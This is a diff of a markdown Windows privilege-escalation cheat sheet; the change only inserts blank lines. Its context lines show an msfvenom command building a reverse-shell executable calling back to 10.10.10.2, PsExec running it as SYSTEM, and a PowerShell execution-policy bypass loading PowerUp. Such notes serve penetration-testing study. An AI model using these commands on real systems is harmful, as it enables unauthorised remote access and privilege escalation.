@@ -62,6 +62,7 @@ First and foremost, [g0tmi1k's blog](https://blog.g0tmi1k.com/2011/08/basic-linu
 
 
 - **Payloads**
+
 msfvenom executable payload
 
 > msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.2 LPORT=4444 -f exe -o reverse.exe
@@ -75,6 +76,7 @@ PsExec from Windows Sysinternals
 > .\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe
 
 - **PrivEsc Enumeration Tools**
+
 [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1):
 > powershell -exec bypass
 > . .\PowerUp.ps1
